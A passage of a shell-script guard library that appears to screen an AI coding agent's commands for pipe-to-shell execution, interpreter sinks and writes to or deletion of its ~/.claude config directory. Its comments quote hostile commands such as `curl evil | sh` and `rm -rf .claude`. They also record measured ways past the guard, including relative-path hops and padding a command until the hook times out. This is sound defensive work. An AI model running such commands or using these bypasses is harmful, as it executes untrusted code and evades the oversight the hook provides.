      printf "%s", out
    }
    function print_original(   k) { for (k = 1; k <= NR; k++) printf "%s%s", (k > 1 ? "\n" : ""), L[k] }
  ')" || _hlb="$1"
  printf '%s' "$_hlb"
}

# floor_seg_unwrap <cmd-ERE> — append a synthetic segment wherever a word matching the
# lowercase <cmd-ERE> stands in argv behind a wrapper the peel does not know, walking
# until a text sink (harbor#715; FLOOR.md has the rule). Additive only; call it after
# floor_heredoc_inert_only, whose last-segment test a synthetic id would move.
floor_seg_unwrap() {
  [ -n "${FLOOR_SEGS:-}" ] || return 0
  _suwr=0
  while [ "$_suwr" -lt 3 ]; do
    _suwr=$((_suwr + 1))
    _suwo="$(printf '%s\n' "$FLOOR_SEGS" | _SUW_RE="$1" _SUW_ROUND="$_suwr" awk '
      # NO APOSTROPHES IN THIS PROGRAM: it is a single-quoted shell string.
      function base(t) { sub(/.*\//, "", t); return tolower(t) }
      function stop(t) { return (base(t) ~ /^(echo|printf|grep|egrep|fgrep|rg|ag|ack|comm|man|which|whereis|whatis|apropos|type|tldr|find)$/) }
      function shell(t) { return (base(t) ~ /^(sh|bash|zsh|ksh|dash|ash|busybox)$/) }
      function idof(s,   p) { s = substr(s, 6); p = index(s, ":"); VAL = substr(s, p + 1); return substr(s, 1, p - 1) + 0 }
      BEGIN { RE = ENVIRON["_SUW_RE"]; ROUND = ENVIRON["_SUW_ROUND"] + 0 }
      /^SEGW:/ { id = idof($0); if (id > MAX) MAX = id; next }
      /^SEGC:/ { id = idof($0); CW[id] = VAL; if (id > MAX) MAX = id; next }
      /^SEGA:/ { id = idof($0); A[id, ++NA[id]] = VAL; next }
      /^SEGR:/ { id = idof($0); R[id, ++NR_[id]] = VAL; next }
      /^SEGU:/ { id = idof($0); DONE[id] = 1; next }
      END {
        nid = MAX
        for (id = 1; id <= MAX; id++) {
          if (!(id in CW) || (id in DONE)) continue
          c = CW[id]
          if (tolower(c) ~ RE || stop(c) || shell(c)) continue
          for (k = 1; k <= NA[id]; k++) {
            t = A[id, k]
            if (stop(t)) break
            if (tolower(t) ~ RE) {
              nid++
              print "SEGU:" id ":"
              print "SEGW:" nid ":" t
              print "SEGC:" nid ":" t
              for (m = k + 1; m <= NA[id]; m++) print "SEGA:" nid ":" A[id, m]
              for (m = 1; m <= NR_[id]; m++) print "SEGR:" nid ":" R[id, m]
              break
            }
            if (shell(t)) {
              for (m = k + 1; m <= NA[id]; m++) {
                if (A[id, m] ~ /^(-[a-zA-Z]*c|--command)$/) {
                  if (m < NA[id] && ROUND < 3) { print "SEGU:" id ":"; print "BODY:" A[id, m + 1] }
                  break
                }
                if (A[id, m] !~ /^-/) break
              }
              break
            }
          }
        }
      }' 2>/dev/null)" || return 0
    [ -n "$_suwo" ] || return 0
    _suwadd="$(printf '%s\n' "$_suwo" | "$FLOOR_GREP" -v '^BODY:' || true)"
    _suwmax="$(printf '%s\n' "$FLOOR_SEGS" "$_suwadd" | sed -n 's/^SEG[WC]:\([0-9][0-9]*\):.*/\1/p' | sort -n | tail -n 1)"
    _suwb="$(printf '%s\n' "$_suwo" | sed -n 's/^BODY://p')"
    if [ -n "$_suwb" ] && [ -f "$FLOOR_AWK" ]; then
      # Each body is its own command: normalized alone, ids moved above the table.
      _suwadd="$_suwadd
$(printf '%s\n' "$_suwb" | while IFS= read -r _suwl; do
          printf '%s' "$_suwl" | awk -f "$FLOOR_AWK" 2>/dev/null | "$FLOOR_GREP" '^SEG' \
            | awk -v off="${_suwmax:-0}" -v OFS=: -F: '{ n = $2 + off; $2 = n; if ($1 == "SEGF") $3 = $3 + off; print }'
          _suwmax=$(( ${_suwmax:-0} + 1000 ))
        done)"
    fi
    FLOOR_SEGS="$FLOOR_SEGS
$_suwadd"
    [ -n "$_suwb" ] || return 0
  done
  return 0
}

# floor_seg_flagval <cmd-ERE> <flag-name-ERE> <value-ERE> — exit 0 iff SOME
# segment runs a matching command AND carries that flag with an adjacent VALUE
# matching <value-ERE>, in either spelling: `--flag value` or `--flag=value`.
#
# WHY ADJACENCY NEEDS ITS OWN HELPER. floor_seg_has asks only whether a token is
# PRESENT in a segment, which is the right question for a verb or a switch and
# the wrong one for a flag whose meaning is carried by the number after it. The
# case that forced it (harbor#194, Codex review of PR #209): `bq update
# --expiration 0` does not arm a deletion timer, it REMOVES one — bq's own help
# says "Specifying 0 removes expiration time" — so a presence test asks the
# operator to confirm, and hard-denies a subagent, at the exact moment someone is
# preventing future data loss. §2.11, pointed the wrong way round.
#
# THE `=` SPELLING IS THE SAME QUESTION. absl-flags accepts `--expiration=3600`,
# and a rule anchored on the bare token matched neither the value nor the flag.
# The name is split off here so one ERE serves both spellings.
#
# BOTH DIRECTIONS OF USE NOW EXIST, and they fail opposite ways — read this
# before adding a third caller.
#   • guard-cloud EXEMPTS with it: "the flag is present AND its value is not the
#     clearing one". An unrecognised or expanded value (`--expiration $SECS`)
#     yields no match, the exemption is withheld, and the command stays
#     destructive-by-default. Fails SAFE.
#   • guard-bash FIRES on it (harbor#196): "an output-destination flag whose
#     value is a floor surface". There an unrecognised value yields no match and
#     the command is ALLOWED. Fails OPEN — which is the direction every scanner
#     in this file takes, and the reason B1's permissions.deny sits underneath
#     needing no parser at all.
#
# THE VALUE IS TESTED IN BOTH SPELLINGS — the raw token and its canonical path
# form — so a path rule needs only the absolute form and `~/.claude`,
# `$HOME/.claude` and `${HOME}/.claude` all reach it. Without that, harbor#196's
# rule matched `-o /Users/me/.claude/bin/guard-bash.sh` and missed the `~/`
# spelling every human actually types, which is a bypass wearing a fix's badge.
#
# ONE awk PASS OVER THE WHOLE TABLE, NOT ONE PER SEGMENT. The first cut of the
# harbor#196 caller passes `.*` as the command ERE — it is verb-agnostic by
# design — so the per-segment loop this helper used to run forked a sed and an
# awk for EVERY segment. P12-perf-04 caught it immediately: its 2000-segment
# payload went from 0.26s to 5s, past the 3s bound, and a PreToolUse hook that
# exceeds its timeout is SKIPPED. Latency here is not a comfort issue, it is a
# fail-open bypass — padding a command would switch the guard off. Same lesson as
# _floor_seg_ids' own comment, re-learned one helper along.
#
# THE EXPANSION IS LAZY for the same reason. floor_expand_paths costs two more
# forks, so the pass reports THREE outcomes — matched; no such flag anywhere; or
# `the flag is present in these segments but no value matched in the RAW
# spelling` — and only the third is worth canonicalising and re-scanning. That
# case is rare: almost every command in a session carries no matching flag at all.
# --short (harbor#788): a single-dash token is also read as getopt reads a bundle.
# The first letter whose `-<letter>` matches takes the rest of the token as its
# value, or the next token when it is last: `-so <v>`, `-sSLo <v>`, `-o<v>`.
# NO APOSTROPHES IN THIS PROGRAM: it is spliced into single-quoted awk below.
_FV_SHORT='
  function sv(t, nx, hasnx,   n, k, L) {
    if (!S || t !~ /^-[A-Za-z]/) return 0
    n = length(t)
    for (k = 2; k <= n; k++) {
      L = substr(t, k, 1)
      if (L !~ /[A-Za-z]/) return 0
      if (("-" L) ~ f) { SEEN = 1; if (k < n) return (substr(t, k + 1) ~ v); return (hasnx && nx ~ v) }
    }
    return 0
  }'
_floor_fv_scan() { # <arg-block> → 0 match · 1 no match   (used for the retry only)
  printf '%s\n' "$1" | awk -v f="$_fvf" -v v="$_fvv" -v S="$_fvs" "$_FV_SHORT"'
    { a[NR] = $0 }
    END {
      for (i = 1; i <= NR; i++) {
        t = a[i]; p = index(t, "=")
        if (p > 0) {
          if (substr(t, 1, p - 1) ~ f && substr(t, p + 1) ~ v) exit 0
        } else if (t ~ f && i < NR && a[i + 1] ~ v) exit 0
        if (sv(t, a[i + 1], i < NR)) exit 0
      }
      exit 1
    }'
}
floor_seg_flagval() { # <cmd-ERE> <flag-name-ERE> <value-ERE> [--short]
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  _fvf="$2"; _fvv="$3"; _fvs=0
  [ "${4:-}" = --short ] && _fvs=1
  # The id is parsed by position rather than by field, because a command word or
  # an argument may itself contain a colon — `curl http://x` is the ordinary case.
  _fvout="$(printf '%s\n' "$FLOOR_SEGS" | awk -v c="$1" -v f="$_fvf" -v v="$_fvv" -v S="$_fvs" "$_FV_SHORT"'
    /^SEGC:/ { s = substr($0, 6); p = index(s, ":")
               id = substr(s, 1, p - 1) + 0
               if (substr(s, p + 1) ~ c) OK[id] = 1
               next }
    /^SEGA:/ { s = substr($0, 6); p = index(s, ":")
               id = substr(s, 1, p - 1) + 0
               N[id]++; A[id, N[id]] = substr(s, p + 1)
               next }
    END {
      pend = ""
      for (id in OK) {
        seen = 0; SEEN = 0
        for (i = 1; i <= N[id] + 0; i++) {
          t = A[id, i]; p = index(t, "=")
          if (p > 0) {
            if (substr(t, 1, p - 1) ~ f) {
              seen = 1
              if (substr(t, p + 1) ~ v) { print "0"; exit }
            }
          } else if (t ~ f) {
            seen = 1
            if (i < N[id] + 0 && A[id, i + 1] ~ v) { print "0"; exit }
          }
          if (sv(t, A[id, i + 1], i < N[id] + 0)) { print "0"; exit }
        }
        if (seen || SEEN) pend = pend id " "
      }
      if (pend != "") print "3 " pend
    }' 2>/dev/null)"
  case "$_fvout" in
    0*) return 0 ;;
    "3 "*)
      for _fvid in ${_fvout#3 }; do
        _fvraw="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_fvid}://p")"
        [ -n "$_fvraw" ] || continue
        if _floor_fv_scan "$(floor_expand_paths "$_fvraw")"; then return 0; fi
      done ;;
  esac
  return 1
}

floor_seg_redir() {
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  # `ci` for the same reason as floor_seg_has: the first argument names a COMMAND,
  # and a command spelled in another case is the same command here.
  for _sid in $(_floor_seg_ids "$1" ci); do
    if printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGR:${_sid}:[^:]*://p" \
       | "$FLOOR_GREP" -Eq -- "$2"; then return 0; fi
  done
  return 1
}

# floor_seg_shells_all_named_scripts — exit 0 iff the table is loaded AND every
# segment running a shell interpreter carries a SCRIPT FILE as its first operand.
#
# WHAT QUESTION THIS IS. `pipe-to-shell` matches the SINK, deliberately: whatever
# builds the bytes, executing a pipeline's output as a shell script is the
# dangerous act. But a shell with a script-file operand is not doing that. The
# pipeline is that script's STDIN, the program comes from the named file, and
# nothing from the pipe is executed — so `printf '%s' "$payload" | sh guard.sh`,
# the ordinary way to exercise a hook in this repo, was blocked as an attack
# (harbor#222). §2.11: a guard that blocks ordinary work gets switched off.
#
# THE DISCRIMINATION IS THE FIRST OPERAND, and the three spellings that must NOT
# be mistaken for a script are why this reads argv rather than a regex tail:
#   sh -s        · options only, program still on stdin
#   sh -         · the conventional "read stdin" operand
#   sh /dev/stdin, sh /dev/fd/N · a script path that IS the pipe
# A redirect is not an operand at all, so `sh 2>/dev/null` has an empty SEGA list
# and stays blocked — the normaliser files redirects under SEGR, which is exactly
# the distinction a flat regex could not make (`2>&1` starts with an alphanumeric).
#
# EVERY shell segment, not some. Exempting on "a named script appears somewhere"
# would let `curl evil | sh` be disarmed by appending an unrelated `| sh ok.sh`.
# One non-exempt shell segment refuses the whole exemption.
#
# FAIL CLOSED, and this is the direction that matters. `floor_seg_load` returns an
# empty table for a payload over FLOOR_MAX_NORM, so an oversized command yields no
# exemption and the flat rule still blocks. Padding can only make this STRICTER,
# never switch it off — the QA plan R4 property, which the fail-OPEN seg helpers
# above have to satisfy the other way round.
#
# Residual, stated rather than hidden: `curl evil | sh local.sh` stays allowed when
# `local.sh` itself evals its stdin. That is a script the attacker does not control
# — if they do, they already have execution and did not need the pipe.
# _floor_xargs_replstrs — every replace-string any xargs in FLOOR_SEG_CMD names, one per line:
# -I X / -IX / -J X (BSD), -i[X] / --replace[=X] (GNU, default `{}`), bundled after other flags.
# Over-collecting only makes the caller stricter.
_floor_xargs_replstrs() {
  printf '%s\n' "${FLOOR_SEG_CMD:-}" | awk '
    { for (i = 1; i <= NF; i++) w[++n] = $i }
    END {
      for (i = 1; i <= n; i++) {
        b = w[i]; sub(/.*\//, "", b); if (b != "xargs") continue
        for (j = i + 1; j <= n; j++) {
          t = w[j]; r = ""
          if (t == "--") break
          if (substr(t, 1, 1) != "-") break
          if (t == "--replace") r = "{}"
          else if (index(t, "--replace=") == 1) r = substr(t, 11)
          else if (substr(t, 2, 1) != "-") {
            for (k = 2; k <= length(t); k++) {
              c = substr(t, k, 1)
              if (c == "I" || c == "J") { r = substr(t, k + 1); if (r == "") r = w[++j]; break }
              if (c == "i") { r = substr(t, k + 1); if (r == "") r = "{}"; break }
              if (index("nLPsdEaRS", c)) { if (k == length(t)) j++; break }
            }
          }
          gsub(/["\047]/, "", r); if (r != "") print r
        }
      }
    }'
}

floor_seg_shells_all_named_scripts() {
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  _ssany=0
  # `_ssid`, not the `_sid` its siblings above use: this runs from inside a rule
  # rather than at the top of a guard, and a shared temp is one nesting away from
  # clobbering a caller's loop variable.
  # NO `ci` HERE, DELIBERATELY, AND THIS IS THE ONE PLACE IT MATTERS. Every other
  # segment helper folds case (harbor#282); this one COUNTS SHELLS to decide
  # whether the harbor#222 named-script exemption applies, and folding case makes
  # it over-count. Measured: with a blanket -i, the word `Bash` inside a heredoc
  # commit message — `a hardcoded WIRE_POST='Read|Bash|Grep|WebFetch'` — became a
  # shell segment with no named script, the exemption failed, and a legitimate
  # `sh <script> | grep` pipeline was refused. One flip in 2,000 real transcript
  # commands, on this repo's daily commit-message idiom.
  for _ssid in $(_floor_seg_ids '(/[a-zA-Z0-9_/.-]*/)?(sh|bash|zsh|dash|ksh|fish|ash|csh|tcsh)'); do
    # FIRST operand only: `bash script.sh --json` is a script run, `bash -s -- x`
    # is not, and only the leading token separates them.
    _ssarg="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_ssid}://p" | head -1)"
    # A `-c` PARENT IS NOT A SHELL RUN, IT IS THE ENVELOPE OF ONE (edge pass
    # 2026-08-29). seg_expand_interpreters re-tokenizes a `-c` payload into child
    # segments, so the shells that actually run appear on their own; the parent
    # is left holding the flag. Counting it disqualified the exemption for
    # `sh -c 'printf x | sh <named script>'` — piping a payload into a named hook
    # script, which is how every hook in this repo is tested, and which is
    # ALLOWED the moment the `sh -c` wrapper is removed. It blocked three tool
    # calls in the pass that found it.
    #
    # SKIPPING IT CANNOT OPEN THE DANGEROUS CASE, because the children answer for
    # themselves: `sh -c 'curl … | sh'` expands to a `curl` segment and a bare
    # `sh` segment with NO operand, and the `[ -n "$_ssarg" ]` arm below still
    # refuses that one. Nor can it open the un-expanded case: if expansion did
    # not happen there are no children, `_ssany` stays 0, and the tail of this
    # function already treats "no shell segment I could check" as no exemption.
    # Only `-c` and its bundled spellings are skipped — `sh -s -- x` reads a
    # script from stdin, is not expanded, and must keep disqualifying.
    # `-c` IS SPELLED OUT SEPARATELY because this is a `case` GLOB, not an ERE:
    # `[a-zA-Z]` matches exactly one character, so `-[a-zA-Z]*c` requires a letter
    # BEFORE the c and matches `-lc` while missing the bare `-c` — the commonest
    # spelling of the three. Measured: `-lc` was exempt and `-c` was not, from one
    # pattern meant to cover both.
    #
    # …AND A `-c` SHELL IS ITSELF A PROGRAMMED RUN, which is the second half
    # (inst-quiet-predicates). It takes its program from the code ARGUMENT, so the
    # pipe is only that program's stdin: `… | xargs -I{} sh -c 'gh run view {}'`
    # executes nothing from the pipe as script, yet with no other shell segment
    # `_ssany` stayed 0 and it blocked. So a `-c` shell now counts as exempt —
    # unless its code turns stdin back into code: no code, a code argument that
    # IS a substitution (`sh -c "$(cat)"` expands it in the piped process), an
    # `eval`/`source`/`.` anywhere in the command, or a stdin path in the code.
    # Child shells still answer for themselves in this loop — so an UN-expanded
    # parent (no SEGI child next, as under `env A=1 sudo bash -c`) is not counted.
    # NOT when xargs splices the pipe INTO the code: `curl … | xargs -I{} sh -c '{}'`
    # executes piped text, so code holding any xargs replace-string refuses. The
    # placeholder as an ARGUMENT (`sh -c 'gh run view "$0"' {}`) stays exempt.
    case "$_ssarg" in
      -c|-[a-zA-Z]*c)
        _sscode="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_ssid}://p" | sed -n 2p)"
        [ -n "$_sscode" ] || return 1
        _ssnext="$(printf '%s\n' "$FLOOR_SEGS" | sed -n 's/^SEGC:\([0-9][0-9]*\):.*/\1/p' \
          | awk -v s="$_ssid" '$1 + 0 > s + 0' | sort -n | head -1)"
        if [ -z "$_ssnext" ] || ! printf '%s\n' "$FLOOR_SEGS" | "$FLOOR_GREP" -q -- "^SEGI:${_ssnext}:"; then
          continue
        fi
        case "$_sscode" in *@SUB@*|*'`'*) return 1 ;; esac
        if printf '%s\n' "$_sscode" | "$FLOOR_GREP" -Eq -- '(^|[^[:alnum:]_-])(eval|source)([^[:alnum:]_-]|$)|(^|[;&|(])[[:space:]]*\.[[:space:]]|/+dev/+(stdin|fd)|/+proc/'; then
          return 1
        fi
        [ -z "$(_floor_seg_ids '(eval|source|\.)')" ] || return 1
        case "${FLOOR_SEG_CMD:-}" in *xargs*)
          while IFS= read -r _ssr; do
            [ -z "$_ssr" ] || case "$_sscode" in *"$_ssr"*) return 1 ;; esac
          done <<XARGS_EOF
$(_floor_xargs_replstrs)
XARGS_EOF
          ;;
        esac
        # A bare interpreter in the code (`sh -c 'python3'`) reads the pipe as ITS program.
        if [ -n "$(_floor_seg_ids '(/[a-zA-Z0-9_/.-]*/)?(python[0-9.]*|pypy[0-9.]*|perl|ruby|node|nodejs|php|lua|luajit|osascript)')" ] \
           && ! floor_seg_interps_all_programmed; then return 1; fi
        _ssany=1
        continue ;;
    esac
    [ -n "$_ssarg" ] || return 1
    case "$_ssarg" in
      -*|/dev/stdin|/dev/fd/*) return 1 ;;
    esac
    _ssany=1
  done
  [ "$_ssany" = 1 ] || return 1
  return 0
}

# floor_seg_interps_all_programmed — exit 0 iff the table is loaded AND every
# segment running a non-shell interpreter (python, perl, ruby, node, php, lua,
# osascript) brings its own program: a script operand or a code/module flag
# (harbor#1313). Sibling of floor_seg_shells_all_named_scripts for the
# interpreters that, run bare or with `-`, execute what arrives on the pipe.
#
# AN ARGV WALK, IN ORDER, because the first decisive word wins: `python - x.py` is
# a stdin program and `python x.py -` is a script. A stdin path or `-` is the
# sink; a code flag (-c/-m python, -e/-E perl, -e ruby/lua/osascript, -e/-p node,
# -r/-f php, glued or bundled) or a non-dash word is a program of its own. Options
# alone decide nothing, so `perl -w` and `python -u` stay sinks. Residual, stated:
# an option VALUE reads as a script word (`python -W ignore`), which exempts a
# pipe that really is a stdin program.
#
# EVERY interpreter segment, and fail closed as above: no table, or an oversized
# payload that yields none, means no exemption and the flat rule blocks.
floor_seg_interps_all_programmed() {
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  _ipany=0
  for _ipid in $(_floor_seg_ids '(/[a-zA-Z0-9_/.-]*/)?(python[0-9.]*|pypy[0-9.]*|perl|ruby|node|nodejs|php|lua|luajit|osascript)'); do
    _ipcmd="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGC:${_ipid}://p" | head -1)"
    _ipcmd="${_ipcmd##*/}"
    _ipprog=0
    for _ipa in $(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_ipid}://p" | tr ' \t' '\n\n'); do
      case "$_ipa" in
        -|/*dev/*stdin|/*dev/*fd/*) return 1 ;;
      esac
      case "$_ipcmd:$_ipa" in
        python*:-c*|python*:-m*|python*:-[a-zA-Z]*[cm]|pypy*:-c*|pypy*:-m*|pypy*:-[a-zA-Z]*[cm]) _ipprog=1 ;;
        perl:-e*|perl:-E*|perl:-[a-zA-Z]*[eE]|ruby:-e*|ruby:-[a-zA-Z]*e) _ipprog=1 ;;
        lua*:-e*|osascript:-e*|node*:-e*|node*:-p*|node*:--eval*|node*:--print*) _ipprog=1 ;;
        php:-r*|php:-f*|php:-[a-zA-Z]*[rf]) _ipprog=1 ;;
        *:-*) ;;
        *) _ipprog=1 ;;
      esac
      [ "$_ipprog" = 1 ] && break
    done
    [ "$_ipprog" = 1 ] || return 1
    _ipany=1
  done
  [ "$_ipany" = 1 ] || return 1
  return 0
}

# floor_seg_cwd_under <dir> [<dir> …] — exit 0 iff FOLDING this command's
# cd/pushd chain lands the working directory AT or BELOW one of <dir>.
#
# THE STICKY-CD TRIGGER ARMED ON ONE HOP ONLY (pass 13, P13-fs-01, measured at
# exit 0 against the live floor). It asked "does some `cd` carry the config dir
# IN ITS OWN ARGUMENT", through a `[^;&|]*` that cannot cross a separator — so
# the directory had to be spelled by ONE cd, in ONE word:
#     cd ~ && cd .claude && echo {} > settings.json     rc=0
#     cd ~; cd .claude; echo {} > settings.json         rc=0
#     pushd ~ && cd .claude && echo {} > settings.json  rc=0   (`pushd` unlisted)
# all of which reach the same settings.json as the one spelling that blocked.
#
# Appending `pushd` and a second hop answers the three spellings somebody tried,
# not the question. The question is WHERE THE COMMAND IS STANDING when the
# mutating segment runs, and the segment table already carries what settles it:
# an ORDERED list of command words with their operands. So fold them — the
# arithmetic the shell itself does — and compare PATHS BY COMPONENT instead of
# matching a spelling. Hops, order, `./` and `../` then cost nothing.
#
# Component comparison is also what keeps `cd ~/.claude-notes` OUT. A directory
# whose name merely begins with the config dir's is not below it, and that is
# now true by construction rather than by a boundary character class every new
# rule has to remember to copy — the omission that shipped a false positive in
# red-team pass 6.
#
# UNKNOWN IS NOT "INSIDE". A hook is never told the real working directory, so
# the fold starts blind and goes blind again at anything it cannot resolve: a
# `cd -`, a substitution, a glob, a relative hop with no anchor before it. That
# is the fail-open direction every scanner in this file takes, and the caller
# keeps its flat trigger alongside for the oversized payload where there is no
# table to fold at all.
floor_seg_cwd_under() { # <dir> [<dir> …]
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  [ "$#" -gt 0 ] || return 1
  # No `cd`/`pushd` anywhere ⇒ nothing to fold. A `case` on a variable is a
  # builtin and the awk below is a fork: pass 12 measured that a PreToolUse hook
  # which exceeds its timeout is SKIPPED, so latency here is a fail-open bypass,
  # not a comfort issue.
  case "$FLOOR_SEGS" in *cd*|*pushd*) ;; *) return 1 ;; esac
  # The directories arrive as INPUT LINES, not as `-v` assignments: awk runs
  # escape processing over a -v value, so a home directory carrying a backslash
  # would reach the comparison as a different string than the one on disk.
  { printf 'CFGD:%s\n' "$@"; printf '%s\n' "$FLOOR_SEGS"; } | awk -v home="$HOME" '
    # Lexical only, and deliberately so: this resolves a path the command has
    # not yet visited, so there is nothing on disk to stat.
    function norm(p,   n, i, a, out, k, lead, r) {
      lead = (substr(p, 1, 1) == "/")
      n = split(p, a, "/"); k = 0
      for (i = 1; i <= n; i++) {
        if (a[i] == "" || a[i] == ".") continue
        if (a[i] == "..") { if (k > 0) k--; continue }
        out[++k] = a[i]
      }
      r = ""
      for (i = 1; i <= k; i++) r = r ((i == 1 && !lead) ? "" : "/") out[i]
      if (r == "") r = lead ? "/" : ""
      return r
    }
    function resolve(t, c) {
      if (t == "~" || t == "$HOME" || t == "${HOME}") return home
      if (substr(t, 1, 2)  == "~/")       return norm(home substr(t, 2))
      if (substr(t, 1, 6)  == "$HOME/")   return norm(home substr(t, 6))
      if (substr(t, 1, 8)  == "${HOME}/") return norm(home substr(t, 8))
      if (substr(t, 1, 1)  == "/")        return norm(t)
      # `~alice/…` is the home of a SECOND ACCOUNT on a shared host.
      # Unresolvable here, but the shape alone identifies that config dir — the
      # spelling pass 13 measured reaching every other surface rule at exit 0.
      if (t ~ /^~[A-Za-z_][A-Za-z0-9_.-]*(\/|$)/) return norm(t)
      # A substitution, a variable or a glob names a directory this parser does
      # not know. Blind, never guessed.
      if (index(t, "@SUB@") || index(t, "$") || index(t, "`") || t ~ /[*?]/) return ""
      if (c == "") return ""
      return norm(c "/" t)
    }
    function inside(p,   i) {
      for (i = 1; i <= nd; i++)
        if (p == D[i] || index(p, D[i] "/") == 1) return 1
      return (p ~ /^~[A-Za-z_][A-Za-z0-9_.-]*\/\.claude(\/|$)/)
    }
    /^CFGD:/ { d = substr($0, 6); sub(/\/+$/, "", d); if (d != "") D[++nd] = d; next }
    /^SEGC:/ { n = $0; sub(/^SEGC:/, "", n); sub(/:.*/, "", n)
               v = $0; sub(/^SEGC:[0-9]+:/, "", v)
               C[n + 0] = v; if (n + 0 > MAX) MAX = n + 0; next }
    # Args accumulate newline-separated. Segment ids are not contiguous — a
    # subshell consumes one — so the fold walks 1..MAX and skips the holes.
    /^SEGA:/ { n = $0; sub(/^SEGA:/, "", n); sub(/:.*/, "", n)
               v = $0; sub(/^SEGA:[0-9]+:/, "", v)
               A[n + 0] = A[n + 0] "\n" v; if (n + 0 > MAX) MAX = n + 0; next }
    END {
      if (nd == 0) exit 1
      cwd = ""
      for (k = 1; k <= MAX; k++) {
        w = C[k]; if (w == "") continue
        sub(/.*\//, "", w)
        # popd unwinds a stack this parser never saw; the shell knows where it
        # lands and we do not.
        if (w == "popd") { cwd = ""; continue }
        if (w != "cd" && w != "pushd") continue
        t = ""; got = 0
        m = split(A[k], ar, "\n")
        for (j = 1; j <= m; j++) {
          if (ar[j] == "" || ar[j] == "--") continue
          if (ar[j] ~ /^-[LPen@]+$/) continue
          t = ar[j]; got = 1; break
        }
        # Bare `cd` is $HOME; bare `pushd` swaps the stack, and `+N`/`-N` rotate
        # it — both land somewhere only the shell knows.
        if (!got)                                cwd = (w == "cd") ? home : ""
        else if (t == "-" || t ~ /^[-+][0-9]+$/) cwd = ""
        else                                     cwd = resolve(t, cwd)
        # STICKY: once the command has stood in the config dir, every later
        # segment is judged as if it still does. Stepping back out with `cd ..`
        # is not evidence of innocence — the mutating segment may be the one in
        # between, and that is the shape the one-hop trigger already treated
        # this way.
        if (cwd != "" && inside(cwd)) exit 0
      }
      exit 1
    }'
}

# floor_seg_operand_under <verb-ERE> <dir> [<dir> …] — exit 0 iff, after folding
# the same cd/pushd chain, some segment whose command matches <verb-ERE> carries
# an OPERAND that resolves to at-or-below one of <dir>.
#
# THE SIBLING QUESTION, AND THE ONE THE CD-BRIDGE ACTUALLY ASKS (edge pass
# 2026-08-29). floor_seg_cwd_under asks "is the command STANDING in the config
# dir"; every spelling that matters here asks "is it standing NEXT TO it and
# reaching in by a relative name". Measured against the installed guard, all of
#     cd ~ && rm -rf .claude        cd ~; rm -rf .claude
#     pushd ~ && rm -rf .claude     (cd ~ && rm -rf .claude)
#     cd ~ && rm -rf .cl*aude       — via any later hop
# exited 0 while 'rm -rf ~/.claude' blocked: the operand was relative, so no
# path rule could see a config dir in it, and the cwd was ~ rather than ~/.claude,
# so the fold said "outside". FLOOR.md records this class as P12-argv-01, rated
# critical and left unpatched; the fold it needed did not exist when it was
# written, and it does now.
#
# THE ANCHOR IS REQUIRED, WHICH IS WHAT KEEPS THIS OFF ORDINARY WORK. `cwd`
# starts EMPTY, and resolve() returns empty for a relative operand with no
# anchor before it — so a bare 'rm -rf .claude' typed in some unknown directory
# is untouched, exactly as it is today. Only a cd/pushd that names a directory
# lexically arms this, and only for operands under it. `cd ~ && rm -rf .cache`
# stays allowed because `.cache` is not the config dir, by component comparison
# rather than by a character class.
#
# UNKNOWN IS STILL NOT "INSIDE": a substitution, a glob or a variable in either
# the cd target or the operand resolves to empty and matches nothing. That is the
# same fail-open direction as its sibling, and the flat rules stay alongside.
floor_seg_operand_under() { # [--dest-only] <verb-ERE> <dir> [<dir> …]
  # --dest-only JUDGES THE LAST OPERAND AND NOTHING ELSE, which is what makes this
  # usable for `cp`. FLOOR.md records three false positives (P12-argv-fp-01/02/03)
  # from rules that matched a config-dir operand without asking which SIDE of the
  # copy it was on: `cp <cfg>/x /tmp/backup` is a READ and must stay allowed, while
  # `cp /tmp/evil <cfg>/settings.json` is the write that matters. One flag rather
  # than a sibling function, because a second copy of the cd-chain fold is two
  # spellings of one rule and that is the drift DOCTRINE/modularity.md is about.
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  _soum=any
  if [ "${1:-}" = "--dest-only" ]; then _soum=last; shift; fi
  [ "$#" -gt 1 ] || return 1
  case "$FLOOR_SEGS" in *cd*|*pushd*) ;; *) return 1 ;; esac
  _souv="$1"; shift
  # Verb and directories arrive as INPUT LINES for the same reason the sibling
  # gives: awk runs escape processing over a -v value.
  { printf 'MODE:%s\n' "$_soum"; printf 'VERB:%s\n' "$_souv"; printf 'CFGD:%s\n' "$@"; printf '%s\n' "$FLOOR_SEGS"; } | awk -v home="$HOME" '
    function norm(p,   n, i, a, out, k, lead, r) {
      lead = (substr(p, 1, 1) == "/")
      n = split(p, a, "/"); k = 0
      for (i = 1; i <= n; i++) {
        if (a[i] == "" || a[i] == ".") continue
        if (a[i] == "..") { if (k > 0) k--; continue }
        out[++k] = a[i]
      }
      r = ""
      for (i = 1; i <= k; i++) r = r ((i == 1 && !lead) ? "" : "/") out[i]
      if (r == "") r = lead ? "/" : ""
      return r
    }
    function resolve(t, c) {
      if (t == "~" || t == "$HOME" || t == "${HOME}") return home
      if (substr(t, 1, 2)  == "~/")       return norm(home substr(t, 2))
      if (substr(t, 1, 6)  == "$HOME/")   return norm(home substr(t, 6))
      if (substr(t, 1, 8)  == "${HOME}/") return norm(home substr(t, 8))
      if (substr(t, 1, 1)  == "/")        return norm(t)
      if (t ~ /^~[A-Za-z_][A-Za-z0-9_.-]*(\/|$)/) return norm(t)
      if (index(t, "@SUB@") || index(t, "$") || index(t, "`") || t ~ /[*?]/) return ""
      if (c == "") return ""
      return norm(c "/" t)
    }
    # A LEADING `=` MEANS EXACT, ANYTHING ELSE MEANS AT-OR-BELOW, and the
    # difference is the whole false-positive story. The first cut matched the
    # config dir as a SUBTREE, which made `cd ~/.claude/MEMORY && rm
    # stale-note.md` a blocked command — deleting one stale note. The suite
    # caught it as S7, an assertion that has guarded that exact shape since pass
    # 7. The config dir is deliberately WRITABLE (B8: "they stay writable by
